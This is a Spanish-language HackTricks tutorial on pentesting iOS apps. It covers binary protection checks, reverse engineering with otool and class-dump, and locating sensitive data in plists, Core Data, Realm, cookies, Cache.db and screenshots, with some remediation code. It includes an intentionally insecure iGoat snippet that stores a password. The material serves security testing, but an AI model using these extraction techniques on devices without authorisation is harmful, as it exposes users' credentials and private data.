# Pentesting de iOS

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias m谩s avanzadas del mundo.\
隆Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceptos b谩sicos de iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Entorno de prueba

En esta p谩gina puedes encontrar informaci贸n sobre el **simulador de iOS**, **emuladores** y **jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## An谩lisis inicial

### Operaciones b谩sicas de prueba en iOS

Durante la prueba, se sugerir谩n **varias operaciones** (conectar al dispositivo, leer/escribir/subir/descargar archivos, usar algunas herramientas...). Por lo tanto, si no sabes c贸mo realizar alguna de estas acciones, por favor, **comienza leyendo la p谩gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para los siguientes pasos, **la aplicaci贸n debe estar instalada** en el dispositivo y ya se debe haber obtenido el **archivo IPA** de la aplicaci贸n.\
Lee la p谩gina [Operaciones b谩sicas de prueba en iOS](basic-ios-testing-operations.md) para aprender c贸mo hacer esto.
{% endhint %}

### An谩lisis est谩tico b谩sico

Se recomienda utilizar la herramienta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar un An谩lisis Est谩tico autom谩tico del archivo IPA.

Identificaci贸n de las **protecciones presentes en el binario**:

*   **PIE (Ejecutable de Posici贸n Independiente)**: Cuando est谩 habilitado, la aplicaci贸n se carga en una direcci贸n de memoria aleatoria cada vez que se inicia, lo que dificulta predecir su direcci贸n de memoria inicial.

```bash
otool -hv <app-binary> | grep PIE   # Deber铆a incluir la bandera PIE
```
*   **Canarios de pila**: Para validar la integridad de la pila, se coloca un valor 'canario' en la pila antes de llamar a una funci贸n y se valida nuevamente una vez que la funci贸n finaliza.

```bash
otool -I -v <app-binary> | grep stack_chk   # Deber铆a incluir los s铆mbolos: stack_chk_guard y stack_chk_fail
```
*   **ARC (Conteo Autom谩tico de Referencias)**: Para prevenir fallas comunes de corrupci贸n de memoria

```bash
otool -I -v <app-binary> | grep objc_release   # Deber铆a incluir el s铆mbolo _objc_release
```
*   **Binario encriptado**: El binario deber铆a estar encriptado

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # El cryptid deber铆a ser 1
```

**Identificaci贸n de Funciones Sensibles/Inseguras**

*   **Algoritmos de Hashing D茅biles**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# En Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Funciones Aleatorias Inseguras**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# En Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Funci贸n 'Malloc' Insegura**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# En Linux
grep -iER "_malloc"
```
*   **Funciones Inseguras y Vulnerables**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# En Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### An谩lisis Din谩mico B谩sico

Revisa el an谩lisis din谩mico que realiza [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Necesitar谩s navegar por las diferentes vistas e interactuar con ellas, pero se enganchar谩 a varias clases y realizar谩 otras acciones, y preparar谩 un informe una vez que hayas terminado.

### Listado de Aplicaciones Instaladas

Utiliza el comando `frida-ps -Uai` para determinar el **identificador de paquete** de las aplicaciones instaladas:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumeraci贸n B谩sica y Hooking

Aprende c贸mo **enumerar los componentes de la aplicaci贸n** y c贸mo **enga帽ar f谩cilmente m茅todos y clases** con objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estructura de IPA

La estructura de un archivo **IPA** es esencialmente la de un **paquete comprimido**. Al cambiar su extensi贸n a `.zip`, se puede **descomprimir** para revelar su contenido. Dentro de esta estructura, un **Bundle** representa una aplicaci贸n completamente empaquetada lista para la instalaci贸n. Dentro, encontrar谩s un directorio llamado `<NAME>.app`, que encapsula los recursos de la aplicaci贸n.

* **`Info.plist`**: Este archivo contiene detalles de configuraci贸n espec铆ficos de la aplicaci贸n.
* **`_CodeSignature/`**: Este directorio incluye un archivo plist que contiene una firma, asegurando la integridad de todos los archivos en el paquete.
* **`Assets.car`**: Un archivo de archivo comprimido que almacena archivos de recursos como iconos.
* **`Frameworks/`**: Esta carpeta alberga las bibliotecas nativas de la aplicaci贸n, que pueden estar en forma de archivos `.dylib` o `.framework`.
* **`PlugIns/`**: Esto puede incluir extensiones de la aplicaci贸n, conocidas como archivos `.appex`, aunque no siempre est谩n presentes.
*[**`Core Data`**](https://developer.apple.com/documentation/coredata): Se utiliza para guardar los datos permanentes de tu aplicaci贸n para uso sin conexi贸n, para almacenar datos temporales y para agregar funcionalidad de deshacer a tu aplicaci贸n en un solo dispositivo. Para sincronizar datos en varios dispositivos en una sola cuenta de iCloud, Core Data refleja autom谩ticamente tu esquema en un contenedor CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): El archivo `PkgInfo` es una forma alternativa de especificar los c贸digos de tipo y creador de tu aplicaci贸n o paquete.
* **en.lproj, fr.proj, Base.lproj**: Son los paquetes de idiomas que contienen recursos para esos idiomas espec铆ficos, y un recurso predeterminado en caso de que un idioma no sea compatible.
* **Seguridad**: El directorio `_CodeSignature/` juega un papel cr铆tico en la seguridad de la aplicaci贸n al verificar la integridad de todos los archivos empaquetados a trav茅s de firmas digitales.
* **Gesti贸n de Activos**: El archivo `Assets.car` utiliza compresi贸n para gestionar eficientemente activos gr谩ficos, crucial para optimizar el rendimiento de la aplicaci贸n y reducir su tama帽o total.
* **Frameworks y PlugIns**: Estos directorios subrayan la modularidad de las aplicaciones de iOS, permitiendo a los desarrolladores incluir bibliotecas de c贸digo reutilizables (`Frameworks/`) y extender la funcionalidad de la aplicaci贸n (`PlugIns/`).
* **Localizaci贸n**: La estructura admite m煤ltiples idiomas, facilitando el alcance global de la aplicaci贸n al incluir recursos para paquetes de idiomas espec铆ficos.

**Info.plist**

El **Info.plist** sirve como piedra angular para las aplicaciones de iOS, encapsulando datos de configuraci贸n clave en forma de pares de **clave-valor**. Este archivo es un requisito no solo para aplicaciones, sino tambi茅n para extensiones de aplicaciones y frameworks empaquetados dentro de 茅l. Est谩 estructurado en XML o en un formato binario y contiene informaci贸n cr铆tica que va desde permisos de la aplicaci贸n hasta configuraciones de seguridad. Para una exploraci贸n detallada de las claves disponibles, se puede consultar la [**Documentaci贸n para Desarrolladores de Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Para aquellos que deseen trabajar con este archivo en un formato m谩s accesible, la conversi贸n a XML se puede lograr f谩cilmente mediante el uso de `plutil` en macOS (disponible nativamente en las versiones 10.2 y posteriores) o `plistutil` en Linux. Los comandos para la conversi贸n son los siguientes:

- **Para macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Para Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Entre la gran cantidad de informaci贸n que el archivo **Info.plist** puede divulgar, las entradas destacadas incluyen cadenas de permisos de la aplicaci贸n (`UsageDescription`), esquemas de URL personalizados (`CFBundleURLTypes`), y configuraciones para la Seguridad del Transporte de la Aplicaci贸n (`NSAppTransportSecurity`). Estas entradas, junto con otras como tipos de documentos personalizados exportados/importados (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), pueden ser f谩cilmente localizadas inspeccionando el archivo o empleando un simple comando `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**Rutas de Datos**

En el entorno de iOS, los directorios est谩n designados espec铆ficamente para las **aplicaciones del sistema** y las **aplicaciones instaladas por el usuario**. Las aplicaciones del sistema residen en el directorio `/Applications`, mientras que las aplicaciones instaladas por el usuario se colocan en `/private/var/containers/`. Estas aplicaciones se les asigna un identificador 煤nico conocido como un **UUID de 128 bits**, lo que hace que la tarea de localizar manualmente la carpeta de una aplicaci贸n sea desafiante debido a la aleatoriedad de los nombres de directorio.

Para facilitar el descubrimiento del directorio de instalaci贸n de una aplicaci贸n instalada por el usuario, la herramienta **objection** proporciona un comando 煤til, `env`. Este comando revela informaci贸n detallada del directorio para la aplicaci贸n en cuesti贸n. A continuaci贸n se muestra un ejemplo de c贸mo utilizar este comando:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternativamente, el nombre de la aplicaci贸n se puede buscar dentro de `/private/var/containers` utilizando el comando `find`:
```bash
find /private/var/containers -name "Progname*"
```
Los comandos como `ps` y `lsof` tambi茅n se pueden utilizar para identificar el proceso de la aplicaci贸n y listar archivos abiertos, respectivamente, proporcionando informaci贸n sobre las rutas de directorio activas de la aplicaci贸n:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Directorio de paquetes:**

* **AppName.app**
* Este es el Paquete de la Aplicaci贸n como se ve铆a antes en el IPA, contiene datos esenciales de la aplicaci贸n, contenido est谩tico, as铆 como el binario compilado de la aplicaci贸n.
* Este directorio es visible para los usuarios, pero **los usuarios no pueden escribir en 茅l**.
* El contenido de este directorio **no se respalda**.
* El contenido de esta carpeta se utiliza para **validar la firma del c贸digo**.

**Directorio de datos:**

* **Documents/**
* Contiene todos los datos generados por el usuario. El usuario final de la aplicaci贸n inicia la creaci贸n de estos datos.
* Visible para los usuarios y **los usuarios pueden escribir en 茅l**.
* El contenido de este directorio **se respalda**.
* La aplicaci贸n puede deshabilitar rutas configurando `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Contiene todos los **archivos que no son espec铆ficos del usuario**, como **cach茅s**, **preferencias**, **cookies** y archivos de configuraci贸n de listas de propiedades (plist).
* Las aplicaciones de iOS suelen utilizar los subdirectorios `Application Support` y `Caches`, pero la aplicaci贸n puede crear subdirectorios personalizados.
* **Library/Caches/**
* Contiene **archivos en cach茅 semi-persistentes**.
* Invisible para los usuarios y **los usuarios no pueden escribir en 茅l**.
* El contenido de este directorio **no se respalda**.
* El sistema operativo puede eliminar autom谩ticamente los archivos de este directorio cuando la aplicaci贸n no se est谩 ejecutando y el espacio de almacenamiento es escaso.
* **Library/Application Support/**
* Contiene **archivos persistentes necesarios para ejecutar la aplicaci贸n**.
* **Invisible** **para** **los** **usuarios** y los usuarios no pueden escribir en 茅l.
* El contenido de este directorio **se respalda**.
* La aplicaci贸n puede deshabilitar rutas configurando `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Se utiliza para almacenar propiedades que pueden **persistir incluso despu茅s de que se reinicie una aplicaci贸n**.
* La informaci贸n se guarda, sin cifrar, dentro del sandbox de la aplicaci贸n en un archivo plist llamado \[BUNDLE\_ID].plist.
* Todos los pares clave/valor almacenados usando `NSUserDefaults` se pueden encontrar en este archivo.
* **tmp/**
* Utilice este directorio para escribir **archivos temporales** que no necesitan persistir entre los lanzamientos de la aplicaci贸n.
* Contiene archivos en cach茅 no persistentes.
* **Invisible** para los usuarios.
* El contenido de este directorio no se respalda.
* El sistema operativo puede eliminar autom谩ticamente los archivos de este directorio cuando la aplicaci贸n no se est谩 ejecutando y el espacio de almacenamiento es escaso.

Echemos un vistazo m谩s de cerca al directorio de Paquete de Aplicaci贸n (.app) de iGoat-Swift dentro del directorio de Paquete (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Reversi贸n Binaria

Dentro de la carpeta `<nombre-de-la-aplicaci贸n>.app` encontrar谩s un archivo binario llamado `<nombre-de-la-aplicaci贸n>`. Este es el archivo que se **ejecutar谩**. Puedes realizar una inspecci贸n b谩sica del binario con la herramienta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Verificar si la aplicaci贸n est谩 encriptada**

Verificar si hay alguna salida para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desensamblar el binario**

Desensamblar la secci贸n de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir el segmento de **Objective-C** de la aplicaci贸n de muestra, se puede usar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obtener un c贸digo Objective-C m谩s compacto, puedes usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Sin embargo, las mejores opciones para desensamblar el binario son: [**Hopper**](https://www.hopperapp.com/download.html?) y [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir f谩cilmente y **automatizar flujos de trabajo** impulsados por las herramientas comunitarias m谩s avanzadas del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Almacenamiento de Datos

Para aprender c贸mo iOS almacena datos en el dispositivo, lee esta p谩gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Los siguientes lugares para almacenar informaci贸n deben ser verificados **justo despu茅s de instalar la aplicaci贸n**, **despu茅s de revisar todas las funcionalidades** de la aplicaci贸n e incluso despu茅s de **cerrar sesi贸n de un usuario e iniciar sesi贸n con otro**.\
El objetivo es encontrar **informaci贸n sensible no protegida** de la aplicaci贸n (contrase帽as, tokens), del usuario actual y de usuarios que hayan iniciado sesi贸n previamente.
{% endhint %}

### Plist

Los archivos **plist** son archivos XML estructurados que **contienen pares clave-valor**. Es una forma de almacenar datos de forma persistente, por lo que a veces puedes encontrar **informaci贸n sensible en estos archivos**. Se recomienda revisar estos archivos despu茅s de instalar la aplicaci贸n y despu茅s de usarla intensivamente para ver si se ha escrito nueva informaci贸n.

La forma m谩s com煤n de persistir datos en archivos plist es a trav茅s del uso de **NSUserDefaults**. Este archivo plist se guarda dentro del sandbox de la aplicaci贸n en **`Library/Preferences/<appBundleID>.plist`**

La clase [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) proporciona una interfaz program谩tica para interactuar con el sistema de preferencias predeterminado. El sistema predeterminado permite a una aplicaci贸n personalizar su comportamiento seg煤n las **preferencias del usuario**. Los datos guardados por `NSUserDefaults` se pueden ver en el paquete de la aplicaci贸n. Esta clase almacena **datos** en un **archivo plist**, pero est谩 destinada a ser utilizada con peque帽as cantidades de datos.

Estos datos no pueden ser accedidos directamente a trav茅s de una computadora de confianza, pero se puede acceder realizando una **copia de seguridad**.

Puedes **volcar** la informaci贸n guardada usando **`NSUserDefaults`** utilizando `ios nsuserdefaults get` de objection.

Para encontrar todos los plist utilizados por la aplicaci贸n, puedes acceder a `/private/var/mobile/Containers/Data/Application/{APPID}` y ejecutar:
```bash
find ./ -name "*.plist"
```
Para convertir archivos de formato **XML o binario (bplist)** a XML, est谩n disponibles varios m茅todos dependiendo de tu sistema operativo:

**Para usuarios de macOS:**
Utiliza el comando `plutil`. Es una herramienta integrada en macOS (10.2+), dise帽ada para este prop贸sito:
```bash
$ plutil -convert xml1 Info.plist
```
**Para usuarios de Linux:**
Primero instala `libplist-utils`, luego usa `plistutil` para convertir tu archivo:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Dentro de una Sesi贸n de Objection:**
Para analizar aplicaciones m贸viles, un comando espec铆fico te permite convertir archivos plist directamente:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) es un marco para gestionar la capa de modelo de objetos en tu aplicaci贸n. [Core Data puede usar SQLite como su almacenamiento persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), pero el marco en s铆 no es una base de datos. CoreData no cifra sus datos de forma predeterminada. Sin embargo, se puede agregar una capa de cifrado adicional a CoreData. Consulta el [Repositorio de GitHub](https://github.com/project-imas/encrypted-core-data) para m谩s detalles.

Puedes encontrar la informaci贸n de SQLite Core Data de una aplicaci贸n en la ruta `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Si puedes abrir el SQLite y acceder a informaci贸n sensible, entonces has encontrado una mala configuraci贸n.**

{% code title="C贸digo de iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) es un almac茅n de clave/valor construido sobre SQLite.\
Dado que las bases de datos Yap son bases de datos sqlite, puedes encontrarlas utilizando el comando propuesto en la secci贸n anterior.

### Otras Bases de Datos SQLite

Es com煤n que las aplicaciones creen su propia base de datos sqlite. Pueden estar almacenando datos sensibles en ellas y dej谩ndolos sin cifrar. Por lo tanto, siempre es interesante revisar cada base de datos dentro del directorio de aplicaciones. Ve al directorio de la aplicaci贸n donde se guardan los datos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de datos en tiempo real de Firebase

Los desarrolladores pueden **almacenar y sincronizar datos** en una **base de datos alojada en la nube NoSQL** a trav茅s de las bases de datos en tiempo real de Firebase. Almacenados en formato JSON, los datos se sincronizan en tiempo real con todos los clientes conectados.

Puedes encontrar c贸mo verificar bases de datos de Firebase mal configuradas aqu铆:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de datos Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) y [Realm Swift](https://realm.io/docs/swift/latest/) ofrecen una potente alternativa para el almacenamiento de datos, no proporcionada por Apple. Por defecto, **almacenan datos sin cifrar**, con la posibilidad de habilitar el cifrado a trav茅s de una configuraci贸n espec铆fica.

Las bases de datos se encuentran en: `/private/var/mobile/Containers/Data/Application/{APPID}`. Para explorar estos archivos, se pueden utilizar comandos como:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Para ver estos archivos de base de datos, se recomienda utilizar la herramienta [**Realm Studio**](https://github.com/realm/realm-studio).

Para implementar el cifrado dentro de una base de datos Realm, se puede utilizar el siguiente fragmento de c贸digo:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de datos de Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) se describe como un motor de base de datos **ligero** y **incorporado** que sigue el enfoque **orientado a documentos** (NoSQL). Dise帽ado para ser nativo de **iOS** y **macOS**, ofrece la capacidad de sincronizar datos de forma transparente.

Para identificar posibles bases de datos de Couchbase en un dispositivo, se debe inspeccionar el siguiente directorio:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

iOS almacena las cookies de las aplicaciones en **`Library/Cookies/cookies.binarycookies`** dentro de la carpeta de cada aplicaci贸n. Sin embargo, a veces los desarrolladores deciden guardarlas en el **llavero** ya que el mencionado **archivo de cookies puede ser accedido en las copias de seguridad**.

Para inspeccionar el archivo de cookies puedes usar [**este script de Python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) o utilizar **`ios cookies get`** de objection.\
**Tambi茅n puedes usar objection para** convertir estos archivos a un formato JSON e inspeccionar los datos.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cach茅

Por defecto, NSURLSession almacena datos, como **solicitudes y respuestas HTTP en la base de datos Cache.db**. Esta base de datos puede contener **datos sensibles**, como tokens, nombres de usuario u otra informaci贸n sensible que haya sido almacenada en cach茅. Para encontrar la informaci贸n en cach茅, abre el directorio de datos de la aplicaci贸n (`/var/mobile/Containers/Data/Application/<UUID>`) y ve a `/Library/Caches/<Bundle Identifier>`. La **cach茅 de WebKit tambi茅n se almacena en el archivo Cache.db**. **Objection** puede abrir e interactuar con la base de datos con el comando `sqlite connect Cache.db`, ya que es una **base de datos SQLite normal**.

Se **recomienda deshabilitar el almacenamiento en cach茅 de estos datos**, ya que puede contener informaci贸n sensible en la solicitud o respuesta. La siguiente lista muestra diferentes formas de lograr esto:

1. Se recomienda eliminar las respuestas en cach茅 despu茅s de cerrar sesi贸n. Esto se puede hacer con el m茅todo proporcionado por Apple llamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Puedes llamar a este m茅todo de la siguiente manera:

`URLCache.shared.removeAllCachedResponses()`

Este m茅todo eliminar谩 todas las solicitudes y respuestas en cach茅 del archivo Cache.db.
2. Si no necesitas utilizar las ventajas de las cookies, se recomienda usar la propiedad de configuraci贸n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, que deshabilitar谩 el almacenamiento de cookies y cach茅s.

[Documentaci贸n de Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Un objeto de configuraci贸n de sesi贸n ef铆mera es similar a un objeto de configuraci贸n de sesi贸n predeterminado (ver predeterminado), excepto que el objeto de sesi贸n correspondiente no almacena cach茅s, almacenes de credenciales ni ning煤n dato relacionado con la sesi贸n en el disco. En su lugar, los datos relacionados con la sesi贸n se almacenan en la RAM. La 煤nica vez que una sesi贸n ef铆mera escribe datos en el disco es cuando le indicas que escriba el contenido de una URL en un archivo.`
3. La cach茅 tambi茅n se puede deshabilitar configurando la Pol铆tica de Cach茅 en [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Esto deshabilitar谩 el almacenamiento de cach茅 de cualquier manera, ya sea en memoria o en disco.

### Capturas de pantalla

Cada vez que presionas el bot贸n de inicio, iOS **toma una captura de pantalla de la pantalla actual** para poder realizar la transici贸n a la aplicaci贸n de una manera m谩s suave. Sin embargo, si hay **datos sensibles** en la pantalla actual, se **guardar谩n** en la **imagen** (que **persiste** **a trav茅s** de los **reinicios**). Estas son las capturas de pantalla a las que tambi茅n se puede acceder al hacer doble clic en la pantalla de inicio para cambiar entre aplicaciones.

A menos que el iPhone est茅 con jailbreak, el **atacante** necesita tener **acceso** al **dispositivo** **desbloqueado** para ver estas capturas de pantalla. Por defecto, la 煤ltima captura de pantalla se almacena en el sandbox de la aplicaci贸n en la carpeta `Library/Caches/Snapshots/` o `Library/SplashBoard/Snapshots` (los ordenadores de confianza no pueden acceder al sistema de archivos desde iOS 7.0).

Una forma de prevenir este comportamiento no deseado es poner una pantalla en blanco o eliminar los datos sensibles antes de tomar la captura de pantalla utilizando la funci贸n `ApplicationDidEnterBackground()`.

A continuaci贸n se muestra un m茅todo de remediaci贸n de ejemplo que establecer谩 una captura de pantalla predeterminada.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

